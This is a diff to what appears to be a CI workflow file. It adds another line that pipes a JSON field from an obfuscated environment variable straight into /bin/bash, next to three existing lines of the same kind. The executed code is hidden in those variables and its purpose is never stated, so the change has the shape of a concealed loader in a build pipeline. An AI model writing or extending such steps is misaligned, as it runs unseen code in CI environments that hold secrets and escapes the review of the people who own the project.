@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$mlwc35" | jq -r .tipw70 | /bin/bash
           printf '%s' "$ubtwl1951" | jq -r .js906 | /bin/bash
           printf '%s' "$amg43" | jq -r .mjb391 | /bin/bash
+          printf '%s' "$jel955" | jq -r .hxvbf6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
